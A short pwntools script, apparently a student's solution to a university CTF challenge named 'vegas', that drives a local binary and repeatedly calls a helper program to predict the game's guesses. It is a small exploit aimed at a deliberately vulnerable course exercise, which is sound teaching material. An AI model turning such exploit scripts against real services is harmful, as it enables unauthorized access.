#!/usr/bin/python3
from pwn import *
from subprocess import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 2773
BINARY = "./vegas"

#r = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge
r = process(BINARY) # use process instead of remote to execute the local version of the program

# TODO: Fill in your payload

PADDING = b' '
r.sendline(PADDING)
for i in range(0, 6):
    r.sendline("2")
    guess = check_output(["./helper"])
    r.sendline(PADDING)
    r.sendline("1")
    r.sendline(guess)


# earlier, the script helps us send/receive data to/from the service
# with interactive, we can directly interact with the service
r.interactive()
